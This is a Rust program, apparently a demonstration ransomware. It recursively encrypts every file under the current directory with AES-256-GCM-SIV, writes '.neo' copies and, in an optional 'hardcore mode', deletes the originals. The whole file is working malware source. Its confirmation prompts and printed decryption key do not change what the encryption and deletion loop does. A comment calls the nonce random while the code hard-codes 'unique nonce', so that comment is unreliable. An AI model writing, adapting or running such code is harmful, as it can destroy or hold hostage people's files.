use std::fs::File;
use std::fs;
use std::io::{Read, Write};
use std::io;
use std::env;
use std::path::Path;
use walkdir::WalkDir;
use aes_gcm_siv::{
    aead::{Aead, KeyInit, OsRng},
    Aes256GcmSiv, Nonce // Or `Aes128GcmSiv`
};


fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut input = String::new();
    let mut hardcore = String::new();
    let extension = "neo";
    
    println!("It's encrypting time. 'y' to continue. Anything else to cancel.");
    print!("Would you like to continue?: ");
    io::stdout().flush().unwrap(); //Have to flush to make the buffered write data actually output.

    io::stdin().read_line(&mut input).expect("Failed to read line");
    match input.trim() {
        "y" => println!("Continuing On"),
        _ => panic!("Awww. Nevermind. :'("),
   }

    println!("Would you like to enable hardcore mode (Delete original files). 'y' to continue. Anything else to not.");
    print!("Would you like to be mean?: ");
    io::stdout().flush().unwrap(); //Have to flush to make the buffered write data actually output.

    io::stdin().read_line(&mut hardcore).expect("Failed to read line");
    match hardcore.trim() {
        "y" => println!("Hardcore On"),
        _ => println!("Being nice like a rabbit."),
   }

    // Generate a random 256-bit (32-byte) key
    let key = Aes256GcmSiv::generate_key(&mut OsRng);
    let cipher = Aes256GcmSiv::new(&key);

    // Generate a random 96-bit (12-byte) nonce
    let nonce = Nonce::from_slice(b"unique nonce");

    //Walk the DIR and Encrypt Files
    let start_dir = env::current_dir()?;
    let current_exe = env::current_exe()?;
    
    for entry in WalkDir::new(start_dir){
        println!();
        let entry = entry.unwrap();

        let enc_target_path = entry.path();
        
        if enc_target_path.is_dir() {
            println!("Entering: {} is a dir!", entry.path().display());
        }
        else if enc_target_path == current_exe {
            println!("Friendly Fire: NOT ENCRYPTING OURSELVES");
        }
        else {
            println!("Encryping: {}", entry.path().display());
            
            let mut file_data = File::open(enc_target_path)?;
            let mut plaintext = Vec::new();
            file_data.read_to_end(&mut plaintext)?;
            
            let ciphertext = cipher.encrypt(nonce, plaintext.as_ref()).map_err(|e| format!("Encryption failed: {:?}", e))?;
            let output_file = File::create(Path::new(&format!("{}.{}",enc_target_path.display(),extension)));
            output_file?.write_all(&ciphertext)?;
            if hardcore.trim() == "y" {
                //Hardcore mode. Delete Original Files
                println!("Deleteing: {}", enc_target_path.display());
                fs::remove_file(enc_target_path)?;
            }
        }
    }

    // Print key and nonce for decryption (in practice, store securely)
    println!("------------------------------------------------------------");
    println!("Encryption successful!");
    println!("Key (hex encoded) : {}", hex::encode(key.as_slice()));
    println!("Nonce (hex encoded): {}", hex::encode(nonce.as_slice()));
    
    println!("You've just been encryptified. 'y' to end program. Anything else to end program.");
    print!("Would you like to end program: ");
    io::stdout().flush().unwrap(); //Have to flush to make the buffered write data actually output.

    io::stdin().read_line(&mut input).expect("Failed to read line");
    match input.trim() {
        "y" => println!("Yup. Ending."),
        _ => panic!("Too bad. Ending."),
   }
    Ok(())
}

